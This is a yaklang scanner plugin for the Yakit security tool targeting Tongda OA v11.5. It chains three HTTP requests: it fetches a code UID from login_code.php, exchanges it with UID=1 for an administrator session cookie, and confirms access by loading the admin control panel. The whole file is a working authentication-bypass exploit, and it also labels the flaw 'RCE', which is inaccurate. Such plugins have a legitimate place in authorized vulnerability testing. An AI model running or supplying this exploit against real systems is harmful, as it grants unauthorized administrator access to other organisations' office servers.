# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

// 获取CODEUID和用户UID
handleCheck_uid = func(target, port){
    addr_uid = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr_uid)

    uidpacket = `
GET /ispirit/login_code.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`
    uidrsp,uidreq,_ = poc.HTTP(uidpacket, 
    poc.params({"target":addr_uid}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    if str.MatchAllOfSubString(uidrsp, `HTTP/1.1 200`) {
        //  获取用户UID和CODEUID
        _, body = poc.Split([]byte(uidrsp))
        uid = json.loads(body)["codeuid"]    
        println(uid)
        return  uid
    }
    

}



// 获取用户Cookie
handleCheck_cookie = func(target, port, uid){
    addr_cookie = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr_cookie)

    cookiepacket = `
POST /logincheck_code.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded

CODEUID=_PC{{params(uid)}}&UID=1`
    cookiersp,cookiereq,_ = poc.HTTP(cookiepacket,
    poc.params({"target":addr_cookie, "uid":uid}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    if str.MatchAllOfSubString(cookiersp, `HTTP/1.1 200`) {
        
        //  获取用户Cookie
        cookieheader, cookiebody = str.SplitHTTPHeadersAndBodyFromPacket(cookiersp)
        cookie = re.Find(string(cookieheader), `PHPSESSID=[0-9a-zA-Z]+`)
        println(cookie)
        return cookie
    }
    

}


// 验证Cookie是否登录成功！

handleCheck = func(target,port,cookie){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /general/index.php?isIE=0&modify_pwd=0 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: {{params(cookie)}}; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3c6cf58d; KEY_RANDOMDATA=6119
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target":addr, "cookie":cookie}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAllOfSubString(rsp, `控制面板`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v 通达OA v11.5 login_code.php 任意用户登录", addr)
            risk.NewRisk(
            addr,risk.title("通达OA v11.5 login_code.php 任意用户登录"),
            risk.severity("high"),
            risk.titleVerbose("通达OA v11.5 login_code.php 任意用户登录存在"),
            risk.type("RCE[通达OA v2017]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在通达OA v11.5 login_code.php 任意用户登录")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }



    if len(result.Fingerprint.HttpFlows)>0{
        uid = handleCheck_uid(result.Target,result.Port)
        cookie = handleCheck_cookie(result.Target,result.Port, uid)
        handleCheck(result.Target,result.Port, cookie)
    }
    
}
